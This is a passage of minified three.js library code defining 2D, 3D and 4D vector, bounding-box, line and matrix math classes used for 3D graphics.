a.z===this.z&&a.w===this.w},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];this.w=a[3];return this},toArray:function(){return[this.x,this.y,this.z,this.w]},clone:function(){return new THREE.Quaternion(this.x,this.y,this.z,this.w)}};THREE.Quaternion.slerp=function(a,b,c,e){return c.copy(a).slerp(b,e)};THREE.Vector2=function(a,b){this.x=a||0;this.y=b||0};
THREE.Vector2.prototype={constructor:THREE.Vector2,set:function(a,b){this.x=a;this.y=b;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;default:throw Error("index is out of range: "+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;default:throw Error("index is out of range: "+a);}},copy:function(a){this.x=a.x;this.y=a.y;return this},add:function(a,
b){if(void 0!==b)return console.warn("DEPRECATED: Vector2's .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;return this},addScalar:function(a){this.x+=a;this.y+=a;return this},sub:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector2's .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(a,b);this.x-=a.x;this.y-=
a.y;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;return this},divideScalar:function(a){0!==a?(this.x/=a,this.y/=a):this.set(0,0);return this},min:function(a){this.x>a.x&&(this.x=a.x);this.y>a.y&&(this.y=a.y);return this},max:function(a){this.x<a.x&&(this.x=a.x);this.y<a.y&&(this.y=a.y);return this},clamp:function(a,b){this.x<a.x?this.x=a.x:this.x>b.x&&(this.x=b.x);this.y<a.y?this.y=a.y:this.y>b.y&&(this.y=b.y);return this},
negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y},lengthSq:function(){return this.x*this.x+this.y*this.y},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y)},normalize:function(){return this.divideScalar(this.length())},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x;a=this.y-a.y;return b*b+a*a},setLength:function(a){var b=this.length();0!==b&&a!==b&&this.multiplyScalar(a/
b);return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;return this},equals:function(a){return a.x===this.x&&a.y===this.y},fromArray:function(a){this.x=a[0];this.y=a[1];return this},toArray:function(){return[this.x,this.y]},clone:function(){return new THREE.Vector2(this.x,this.y)}};THREE.Vector3=function(a,b,c){this.x=a||0;this.y=b||0;this.z=c||0};
THREE.Vector3.prototype={constructor:THREE.Vector3,set:function(a,b,c){this.x=a;this.y=b;this.z=c;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;default:throw Error("index is out of range: "+a);}},getComponent:function(a){switch(a){case 0:return this.x;case 1:return this.y;case 2:return this.z;default:throw Error("index is out of range: "+
a);}},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;return this},add:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector3's .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;return this},addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;return this},sub:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector3's .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),
this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;return this},multiply:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector3's .multiply() now only accepts one argument. Use .multiplyVectors( a, b ) instead."),this.multiplyVectors(a,b);this.x*=a.x;this.y*=a.y;this.z*=a.z;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;this.z*=a;return this},multiplyVectors:function(a,b){this.x=a.x*
b.x;this.y=a.y*b.y;this.z=a.z*b.z;return this},applyMatrix3:function(a){var b=this.x,c=this.y,e=this.z;a=a.elements;this.x=a[0]*b+a[3]*c+a[6]*e;this.y=a[1]*b+a[4]*c+a[7]*e;this.z=a[2]*b+a[5]*c+a[8]*e;return this},applyMatrix4:function(a){var b=this.x,c=this.y,e=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*e+a[12];this.y=a[1]*b+a[5]*c+a[9]*e+a[13];this.z=a[2]*b+a[6]*c+a[10]*e+a[14];return this},applyProjection:function(a){var b=this.x,c=this.y,e=this.z;a=a.elements;var g=1/(a[3]*b+a[7]*c+a[11]*e+
a[15]);this.x=(a[0]*b+a[4]*c+a[8]*e+a[12])*g;this.y=(a[1]*b+a[5]*c+a[9]*e+a[13])*g;this.z=(a[2]*b+a[6]*c+a[10]*e+a[14])*g;return this},applyQuaternion:function(a){var b=this.x,c=this.y,e=this.z,g=a.x,f=a.y,h=a.z;a=a.w;var k=a*b+f*e-h*c,p=a*c+h*b-g*e,m=a*e+g*c-f*b,b=-g*b-f*c-h*e;this.x=k*a+b*-g+p*-h-m*-f;this.y=p*a+b*-f+m*-g-k*-h;this.z=m*a+b*-h+k*-f-p*-g;return this},transformDirection:function(a){var b=this.x,c=this.y,e=this.z;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*e;this.y=a[1]*b+a[5]*c+a[9]*e;
this.z=a[2]*b+a[6]*c+a[10]*e;this.normalize();return this},divide:function(a){this.x/=a.x;this.y/=a.y;this.z/=a.z;return this},divideScalar:function(a){0!==a?(this.x/=a,this.y/=a,this.z/=a):this.z=this.y=this.x=0;return this},min:function(a){this.x>a.x&&(this.x=a.x);this.y>a.y&&(this.y=a.y);this.z>a.z&&(this.z=a.z);return this},max:function(a){this.x<a.x&&(this.x=a.x);this.y<a.y&&(this.y=a.y);this.z<a.z&&(this.z=a.z);return this},clamp:function(a,b){this.x<a.x?this.x=a.x:this.x>b.x&&(this.x=b.x);
this.y<a.y?this.y=a.y:this.y>b.y&&(this.y=b.y);this.z<a.z?this.z=a.z:this.z>b.z&&(this.z=b.z);return this},negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length())},
setLength:function(a){var b=this.length();0!==b&&a!==b&&this.multiplyScalar(a/b);return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;return this},cross:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector3's .cross() now only accepts one argument. Use .crossVectors( a, b ) instead."),this.crossVectors(a,b);var c=this.x,e=this.y,g=this.z;this.x=e*a.z-g*a.y;this.y=g*a.x-c*a.z;this.z=c*a.y-e*a.x;return this},crossVectors:function(a,b){this.x=
a.y*b.z-a.z*b.y;this.y=a.z*b.x-a.x*b.z;this.z=a.x*b.y-a.y*b.x;return this},angleTo:function(a){a=this.dot(a)/(this.length()*a.length());return Math.acos(THREE.Math.clamp(a,-1,1))},distanceTo:function(a){return Math.sqrt(this.distanceToSquared(a))},distanceToSquared:function(a){var b=this.x-a.x,c=this.y-a.y;a=this.z-a.z;return b*b+c*c+a*a},setEulerFromRotationMatrix:function(a,b){function c(a){return Math.min(Math.max(a,-1),1)}var e=a.elements,g=e[0],f=e[4],h=e[8],k=e[1],p=e[5],m=e[9],t=e[2],w=e[6],
e=e[10];void 0===b||"XYZ"===b?(this.y=Math.asin(c(h)),.99999>Math.abs(h)?(this.x=Math.atan2(-m,e),this.z=Math.atan2(-f,g)):(this.x=Math.atan2(w,p),this.z=0)):"YXZ"===b?(this.x=Math.asin(-c(m)),.99999>Math.abs(m)?(this.y=Math.atan2(h,e),this.z=Math.atan2(k,p)):(this.y=Math.atan2(-t,g),this.z=0)):"ZXY"===b?(this.x=Math.asin(c(w)),.99999>Math.abs(w)?(this.y=Math.atan2(-t,e),this.z=Math.atan2(-f,p)):(this.y=0,this.z=Math.atan2(k,g))):"ZYX"===b?(this.y=Math.asin(-c(t)),.99999>Math.abs(t)?(this.x=Math.atan2(w,
e),this.z=Math.atan2(k,g)):(this.x=0,this.z=Math.atan2(-f,p))):"YZX"===b?(this.z=Math.asin(c(k)),.99999>Math.abs(k)?(this.x=Math.atan2(-m,p),this.y=Math.atan2(-t,g)):(this.x=0,this.y=Math.atan2(h,e))):"XZY"===b&&(this.z=Math.asin(-c(f)),.99999>Math.abs(f)?(this.x=Math.atan2(w,p),this.y=Math.atan2(h,g)):(this.x=Math.atan2(-m,e),this.y=0));return this},setEulerFromQuaternion:function(a,b){function c(a){return Math.min(Math.max(a,-1),1)}var e=a.x*a.x,g=a.y*a.y,f=a.z*a.z,h=a.w*a.w;void 0===b||"XYZ"===
b?(this.x=Math.atan2(2*(a.x*a.w-a.y*a.z),h-e-g+f),this.y=Math.asin(c(2*(a.x*a.z+a.y*a.w))),this.z=Math.atan2(2*(a.z*a.w-a.x*a.y),h+e-g-f)):"YXZ"===b?(this.x=Math.asin(c(2*(a.x*a.w-a.y*a.z))),this.y=Math.atan2(2*(a.x*a.z+a.y*a.w),h-e-g+f),this.z=Math.atan2(2*(a.x*a.y+a.z*a.w),h-e+g-f)):"ZXY"===b?(this.x=Math.asin(c(2*(a.x*a.w+a.y*a.z))),this.y=Math.atan2(2*(a.y*a.w-a.z*a.x),h-e-g+f),this.z=Math.atan2(2*(a.z*a.w-a.x*a.y),h-e+g-f)):"ZYX"===b?(this.x=Math.atan2(2*(a.x*a.w+a.z*a.y),h-e-g+f),this.y=Math.asin(c(2*
(a.y*a.w-a.x*a.z))),this.z=Math.atan2(2*(a.x*a.y+a.z*a.w),h+e-g-f)):"YZX"===b?(this.x=Math.atan2(2*(a.x*a.w-a.z*a.y),h-e+g-f),this.y=Math.atan2(2*(a.y*a.w-a.x*a.z),h+e-g-f),this.z=Math.asin(c(2*(a.x*a.y+a.z*a.w)))):"XZY"===b&&(this.x=Math.atan2(2*(a.x*a.w+a.y*a.z),h-e+g-f),this.y=Math.atan2(2*(a.x*a.z+a.y*a.w),h+e-g-f),this.z=Math.asin(c(2*(a.z*a.w-a.x*a.y))));return this},getPositionFromMatrix:function(a){this.x=a.elements[12];this.y=a.elements[13];this.z=a.elements[14];return this},getScaleFromMatrix:function(a){var b=
this.set(a.elements[0],a.elements[1],a.elements[2]).length(),c=this.set(a.elements[4],a.elements[5],a.elements[6]).length();a=this.set(a.elements[8],a.elements[9],a.elements[10]).length();this.x=b;this.y=c;this.z=a;return this},getColumnFromMatrix:function(a,b){var c=4*a,e=b.elements;this.x=e[c];this.y=e[c+1];this.z=e[c+2];return this},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];return this},toArray:function(){return[this.x,
this.y,this.z]},clone:function(){return new THREE.Vector3(this.x,this.y,this.z)}};
THREE.extend(THREE.Vector3.prototype,{applyEuler:function(){var a=new THREE.Quaternion;return function(b,c){var e=a.setFromEuler(b,c);this.applyQuaternion(e);return this}}(),applyAxisAngle:function(){var a=new THREE.Quaternion;return function(b,c){var e=a.setFromAxisAngle(b,c);this.applyQuaternion(e);return this}}(),projectOnVector:function(){var a=new THREE.Vector3;return function(b){a.copy(b).normalize();b=this.dot(a);return this.copy(a).multiplyScalar(b)}}(),projectOnPlane:function(){var a=new THREE.Vector3;
return function(b){a.copy(this).projectOnVector(b);return this.sub(a)}}(),reflect:function(){var a=new THREE.Vector3;return function(b){a.copy(this).projectOnVector(b).multiplyScalar(2);return this.subVectors(a,this)}}()});THREE.Vector4=function(a,b,c,e){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==e?e:1};
THREE.Vector4.prototype={constructor:THREE.Vector4,set:function(a,b,c,e){this.x=a;this.y=b;this.z=c;this.w=e;return this},setX:function(a){this.x=a;return this},setY:function(a){this.y=a;return this},setZ:function(a){this.z=a;return this},setW:function(a){this.w=a;return this},setComponent:function(a,b){switch(a){case 0:this.x=b;break;case 1:this.y=b;break;case 2:this.z=b;break;case 3:this.w=b;break;default:throw Error("index is out of range: "+a);}},getComponent:function(a){switch(a){case 0:return this.x;
case 1:return this.y;case 2:return this.z;case 3:return this.w;default:throw Error("index is out of range: "+a);}},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=void 0!==a.w?a.w:1;return this},add:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector4's .add() now only accepts one argument. Use .addVectors( a, b ) instead."),this.addVectors(a,b);this.x+=a.x;this.y+=a.y;this.z+=a.z;this.w+=a.w;return this},addScalar:function(a){this.x+=a;this.y+=a;this.z+=a;this.w+=a;return this},
addVectors:function(a,b){this.x=a.x+b.x;this.y=a.y+b.y;this.z=a.z+b.z;this.w=a.w+b.w;return this},sub:function(a,b){if(void 0!==b)return console.warn("DEPRECATED: Vector4's .sub() now only accepts one argument. Use .subVectors( a, b ) instead."),this.subVectors(a,b);this.x-=a.x;this.y-=a.y;this.z-=a.z;this.w-=a.w;return this},subVectors:function(a,b){this.x=a.x-b.x;this.y=a.y-b.y;this.z=a.z-b.z;this.w=a.w-b.w;return this},multiplyScalar:function(a){this.x*=a;this.y*=a;this.z*=a;this.w*=a;return this},
applyMatrix4:function(a){var b=this.x,c=this.y,e=this.z,g=this.w;a=a.elements;this.x=a[0]*b+a[4]*c+a[8]*e+a[12]*g;this.y=a[1]*b+a[5]*c+a[9]*e+a[13]*g;this.z=a[2]*b+a[6]*c+a[10]*e+a[14]*g;this.w=a[3]*b+a[7]*c+a[11]*e+a[15]*g;return this},divideScalar:function(a){0!==a?(this.x/=a,this.y/=a,this.z/=a,this.w/=a):(this.z=this.y=this.x=0,this.w=1);return this},setAxisAngleFromQuaternion:function(a){this.w=2*Math.acos(a.w);var b=Math.sqrt(1-a.w*a.w);1E-4>b?(this.x=1,this.z=this.y=0):(this.x=a.x/b,this.y=
a.y/b,this.z=a.z/b);return this},setAxisAngleFromRotationMatrix:function(a){var b,c,e;a=a.elements;var g=a[0];e=a[4];var f=a[8],h=a[1],k=a[5],p=a[9];c=a[2];b=a[6];var m=a[10];if(.01>Math.abs(e-h)&&.01>Math.abs(f-c)&&.01>Math.abs(p-b)){if(.1>Math.abs(e+h)&&.1>Math.abs(f+c)&&.1>Math.abs(p+b)&&.1>Math.abs(g+k+m-3))return this.set(1,0,0,0),this;a=Math.PI;g=(g+1)/2;k=(k+1)/2;m=(m+1)/2;e=(e+h)/4;f=(f+c)/4;p=(p+b)/4;g>k&&g>m?.01>g?(b=0,e=c=.707106781):(b=Math.sqrt(g),c=e/b,e=f/b):k>m?.01>k?(b=.707106781,
c=0,e=.707106781):(c=Math.sqrt(k),b=e/c,e=p/c):.01>m?(c=b=.707106781,e=0):(e=Math.sqrt(m),b=f/e,c=p/e);this.set(b,c,e,a);return this}a=Math.sqrt((b-p)*(b-p)+(f-c)*(f-c)+(h-e)*(h-e));.001>Math.abs(a)&&(a=1);this.x=(b-p)/a;this.y=(f-c)/a;this.z=(h-e)/a;this.w=Math.acos((g+k+m-1)/2);return this},min:function(a){this.x>a.x&&(this.x=a.x);this.y>a.y&&(this.y=a.y);this.z>a.z&&(this.z=a.z);this.w>a.w&&(this.w=a.w);return this},max:function(a){this.x<a.x&&(this.x=a.x);this.y<a.y&&(this.y=a.y);this.z<a.z&&
(this.z=a.z);this.w<a.w&&(this.w=a.w);return this},clamp:function(a,b){this.x<a.x?this.x=a.x:this.x>b.x&&(this.x=b.x);this.y<a.y?this.y=a.y:this.y>b.y&&(this.y=b.y);this.z<a.z?this.z=a.z:this.z>b.z&&(this.z=b.z);this.w<a.w?this.w=a.w:this.w>b.w&&(this.w=b.w);return this},negate:function(){return this.multiplyScalar(-1)},dot:function(a){return this.x*a.x+this.y*a.y+this.z*a.z+this.w*a.w},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*
this.x+this.y*this.y+this.z*this.z+this.w*this.w)},lengthManhattan:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)+Math.abs(this.w)},normalize:function(){return this.divideScalar(this.length())},setLength:function(a){var b=this.length();0!==b&&a!==b&&this.multiplyScalar(a/b);return this},lerp:function(a,b){this.x+=(a.x-this.x)*b;this.y+=(a.y-this.y)*b;this.z+=(a.z-this.z)*b;this.w+=(a.w-this.w)*b;return this},equals:function(a){return a.x===this.x&&a.y===this.y&&a.z===this.z&&
a.w===this.w},fromArray:function(a){this.x=a[0];this.y=a[1];this.z=a[2];this.w=a[3];return this},toArray:function(){return[this.x,this.y,this.z,this.w]},clone:function(){return new THREE.Vector4(this.x,this.y,this.z,this.w)}};THREE.Line3=function(a,b){this.start=void 0!==a?a:new THREE.Vector3;this.end=void 0!==b?b:new THREE.Vector3};
THREE.Line3.prototype={constructor:THREE.Line3,set:function(a,b){this.start.copy(a);this.end.copy(b);return this},copy:function(a){this.start.copy(a.start);this.end.copy(a.end);return this},center:function(a){return(a||new THREE.Vector3).addVectors(this.start,this.end).multiplyScalar(.5)},delta:function(a){return(a||new THREE.Vector3).subVectors(this.end,this.start)},distanceSq:function(){return this.start.distanceToSquared(this.end)},distance:function(){return this.start.distanceTo(this.end)},at:function(a,
b){var c=b||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},closestPointToPointParameter:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c,e){a.subVectors(c,this.start);b.subVectors(this.end,this.start);var g=b.dot(b),g=b.dot(a)/g;e&&(g=THREE.Math.clamp(g,0,1));return g}}(),closestPointToPoint:function(a,b,c){a=this.closestPointToPointParameter(a,b);c=c||new THREE.Vector3;return this.delta(c).multiplyScalar(a).add(this.start)},applyMatrix4:function(a){this.start.applyMatrix4(a);
this.end.applyMatrix4(a);return this},equals:function(a){return a.start.equals(this.start)&&a.end.equals(this.end)},clone:function(){return(new THREE.Line3).copy(this)}};THREE.Box2=function(a,b){this.min=void 0!==a?a:new THREE.Vector2(Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector2(-Infinity,-Infinity)};
THREE.Box2.prototype={constructor:THREE.Box2,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){if(0<a.length){var b=a[0];this.min.copy(b);this.max.copy(b);for(var c=1,e=a.length;c<e;c++)b=a[c],b.x<this.min.x?this.min.x=b.x:b.x>this.max.x&&(this.max.x=b.x),b.y<this.min.y?this.min.y=b.y:b.y>this.max.y&&(this.max.y=b.y)}else this.makeEmpty();return this},setFromCenterAndSize:function(){var a=new THREE.Vector2;return function(b,c){var e=a.copy(c).multiplyScalar(.5);
this.min.copy(b).sub(e);this.max.copy(b).add(e);return this}}(),copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=Infinity;this.max.x=this.max.y=-Infinity;return this},empty:function(){return this.max.x<this.min.x||this.max.y<this.min.y},center:function(a){return(a||new THREE.Vector2).addVectors(this.min,this.max).multiplyScalar(.5)},size:function(a){return(a||new THREE.Vector2).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);
this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y?!0:!1},getParameter:function(a){return new THREE.Vector2((a.x-this.min.x)/(this.max.x-this.min.x),
(a.y-this.min.y)/(this.max.y-this.min.y))},isIntersectionBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector2).copy(a).clamp(this.min,this.max)},distanceToPoint:function(){var a=new THREE.Vector2;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);
return this},translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)},clone:function(){return(new THREE.Box2).copy(this)}};THREE.Box3=function(a,b){this.min=void 0!==a?a:new THREE.Vector3(Infinity,Infinity,Infinity);this.max=void 0!==b?b:new THREE.Vector3(-Infinity,-Infinity,-Infinity)};
THREE.Box3.prototype={constructor:THREE.Box3,set:function(a,b){this.min.copy(a);this.max.copy(b);return this},setFromPoints:function(a){if(0<a.length){var b=a[0];this.min.copy(b);this.max.copy(b);for(var c=1,e=a.length;c<e;c++)b=a[c],b.x<this.min.x?this.min.x=b.x:b.x>this.max.x&&(this.max.x=b.x),b.y<this.min.y?this.min.y=b.y:b.y>this.max.y&&(this.max.y=b.y),b.z<this.min.z?this.min.z=b.z:b.z>this.max.z&&(this.max.z=b.z)}else this.makeEmpty();return this},setFromCenterAndSize:function(){var a=new THREE.Vector3;
return function(b,c){var e=a.copy(c).multiplyScalar(.5);this.min.copy(b).sub(e);this.max.copy(b).add(e);return this}}(),copy:function(a){this.min.copy(a.min);this.max.copy(a.max);return this},makeEmpty:function(){this.min.x=this.min.y=this.min.z=Infinity;this.max.x=this.max.y=this.max.z=-Infinity;return this},empty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},center:function(a){return(a||new THREE.Vector3).addVectors(this.min,this.max).multiplyScalar(.5)},
size:function(a){return(a||new THREE.Vector3).subVectors(this.max,this.min)},expandByPoint:function(a){this.min.min(a);this.max.max(a);return this},expandByVector:function(a){this.min.sub(a);this.max.add(a);return this},expandByScalar:function(a){this.min.addScalar(-a);this.max.addScalar(a);return this},containsPoint:function(a){return a.x<this.min.x||a.x>this.max.x||a.y<this.min.y||a.y>this.max.y||a.z<this.min.z||a.z>this.max.z?!1:!0},containsBox:function(a){return this.min.x<=a.min.x&&a.max.x<=
this.max.x&&this.min.y<=a.min.y&&a.max.y<=this.max.y&&this.min.z<=a.min.z&&a.max.z<=this.max.z?!0:!1},getParameter:function(a){return new THREE.Vector3((a.x-this.min.x)/(this.max.x-this.min.x),(a.y-this.min.y)/(this.max.y-this.min.y),(a.z-this.min.z)/(this.max.z-this.min.z))},isIntersectionBox:function(a){return a.max.x<this.min.x||a.min.x>this.max.x||a.max.y<this.min.y||a.min.y>this.max.y||a.max.z<this.min.z||a.min.z>this.max.z?!1:!0},clampPoint:function(a,b){return(b||new THREE.Vector3).copy(a).clamp(this.min,
this.max)},distanceToPoint:function(){var a=new THREE.Vector3;return function(b){return a.copy(b).clamp(this.min,this.max).sub(b).length()}}(),getBoundingSphere:function(){var a=new THREE.Vector3;return function(b){b=b||new THREE.Sphere;b.center=this.center();b.radius=.5*this.size(a).length();return b}}(),intersect:function(a){this.min.max(a.min);this.max.min(a.max);return this},union:function(a){this.min.min(a.min);this.max.max(a.max);return this},applyMatrix4:function(){var a=[new THREE.Vector3,
new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3,new THREE.Vector3];return function(b){a[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(b);a[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(b);a[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(b);a[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(b);a[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(b);a[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(b);a[6].set(this.max.x,
this.max.y,this.min.z).applyMatrix4(b);a[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(b);this.makeEmpty();this.setFromPoints(a);return this}}(),translate:function(a){this.min.add(a);this.max.add(a);return this},equals:function(a){return a.min.equals(this.min)&&a.max.equals(this.max)},clone:function(){return(new THREE.Box3).copy(this)}};
THREE.Matrix3=function(a,b,c,e,g,f,h,k,p){this.elements=new Float32Array(9);this.set(void 0!==a?a:1,b||0,c||0,e||0,void 0!==g?g:1,f||0,h||0,k||0,void 0!==p?p:1)};
THREE.Matrix3.prototype={constructor:THREE.Matrix3,set:function(a,b,c,e,g,f,h,k,p){var m=this.elements;m[0]=a;m[3]=b;m[6]=c;m[1]=e;m[4]=g;m[7]=f;m[2]=h;m[5]=k;m[8]=p;return this},identity:function(){this.set(1,0,0,0,1,0,0,0,1);return this},copy:function(a){a=a.elements;this.set(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8]);return this},multiplyVector3:function(a){console.warn("DEPRECATED: Matrix3's .multiplyVector3() has been removed. Use vector.applyMatrix3( matrix ) instead.");return a.applyMatrix3(this)},
multiplyVector3Array:function(){var a=new THREE.Vector3;return function(b){for(var c=0,e=b.length;c<e;c+=3)a.x=b[c],a.y=b[c+1],a.z=b[c+2],a.applyMatrix3(this),b[c]=a.x,b[c+1]=a.y,b[c+2]=a.z;return b}}(),multiplyScalar:function(a){var b=this.elements;b[0]*=a;b[3]*=a;b[6]*=a;b[1]*=a;b[4]*=a;b[7]*=a;b[2]*=a;b[5]*=a;b[8]*=a;return this},determinant:function(){var a=this.elements,b=a[0],c=a[1],e=a[2],g=a[3],f=a[4],h=a[5],k=a[6],p=a[7],a=a[8];return b*f*a-b*h*p-c*g*a+c*h*k+e*g*p-e*f*k},getInverse:function(a,
b){var c=a.elements,e=this.elements;e[0]=c[10]*c[5]-c[6]*c[9];e[1]=-c[10]*c[1]+c[2]*c[9];e[2]=c[6]*c[1]-c[2]*c[5];e[3]=-c[10]*c[4]+c[6]*c[8];e[4]=c[10]*c[0]-c[2]*c[8];e[5]=-c[6]*c[0]+c[2]*c[4];e[6]=c[9]*c[4]-c[5]*c[8];e[7]=-c[9]*c[0]+c[1]*c[8];e[8]=c[5]*c[0]-c[1]*c[4];c=c[0]*e[0]+c[1]*e[3]+c[2]*e[6];if(0===c){if(b)throw Error("Matrix3.getInverse(): can't invert matrix, determinant is 0");console.warn("Matrix3.getInverse(): can't invert matrix, determinant is 0");this.identity();return this}this.multiplyScalar(1/
c);return this},transpose:function(){var a,b=this.elements;a=b[1];b[1]=b[3];b[3]=a;a=b[2];b[2]=b[6];b[6]=a;a=b[5];b[5]=b[7];b[7]=a;return this},getNormalMatrix:function(a){this.getInverse(a).transpose();return this},transposeIntoArray:function(a){var b=this.elements;a[0]=b[0];a[1]=b[3];a[2]=b[6];a[3]=b[1];a[4]=b[4];a[5]=b[7];a[6]=b[2];a[7]=b[5];a[8]=b[8];return this},clone:function(){var a=this.elements;return new THREE.Matrix3(a[0],a[3],a[6],a[1],a[4],a[7],a[2],a[5],a[8])}};
THREE.Matrix4=function(a,b,c,e,g,f,h,k,p,m,t,w,q,y,r,z){var C=this.elements=new Float32Array(16);C[0]=void 0!==a?a:1;C[4]=b||0;C[8]=c||0;C[12]=e||0;C[1]=g||0;C[5]=void 0!==f?f:1;C[9]=h||0;C[13]=k||0;C[2]=p||0;C[6]=m||0;C[10]=void 0!==t?t:1;C[14]=w||0;C[3]=q||0;C[7]=y||0;C[11]=r||0;C[15]=void 0!==z?z:1};
THREE.Matrix4.prototype={constructor:THREE.Matrix4,set:function(a,b,c,e,g,f,h,k,p,m,t,w,q,y,r,z){var C=this.elements;C[0]=a;C[4]=b;C[8]=c;C[12]=e;C[1]=g;C[5]=f;C[9]=h;C[13]=k;C[2]=p;C[6]=m;C[10]=t;C[14]=w;C[3]=q;C[7]=y;C[11]=r;C[15]=z;return this},identity:function(){this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1);return this},copy:function(a){a=a.elements;this.set(a[0],a[4],a[8],a[12],a[1],a[5],a[9],a[13],a[2],a[6],a[10],a[14],a[3],a[7],a[11],a[15]);return this},extractPosition:function(a){console.warn("DEPRECATED: Matrix4's .extractPosition() has been renamed to .copyPosition().");
return this.copyPosition(a)},copyPosition:function(a){var b=this.elements;a=a.elements;b[12]=a[12];b[13]=a[13];b[14]=a[14];return this},extractRotation:function(){var a=new THREE.Vector3;return function(b){var c=this.elements;b=b.elements;var e=1/a.set(b[0],b[1],b[2]).length(),g=1/a.set(b[4],b[5],b[6]).length(),f=1/a.set(b[8],b[9],b[10]).length();c[0]=b[0]*e;c[1]=b[1]*e;c[2]=b[2]*e;c[4]=b[4]*g;c[5]=b[5]*g;c[6]=b[6]*g;c[8]=b[8]*f;c[9]=b[9]*f;c[10]=b[10]*f;return this}}(),setRotationFromEuler:function(a,
